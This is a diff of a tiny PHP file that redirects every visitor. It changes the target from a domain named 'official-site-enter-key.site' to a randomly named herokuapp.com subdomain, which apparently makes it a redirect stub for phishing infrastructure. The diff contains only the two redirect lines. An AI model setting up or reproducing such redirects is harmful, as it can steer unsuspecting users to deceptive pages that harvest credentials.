@@ -1,4 +1,4 @@
 <?php
-header("Location: https://official-site-enter-key.site/actyou/");
+header("Location: https://gm1359dsgs.herokuapp.com/");
 die();
 ?>
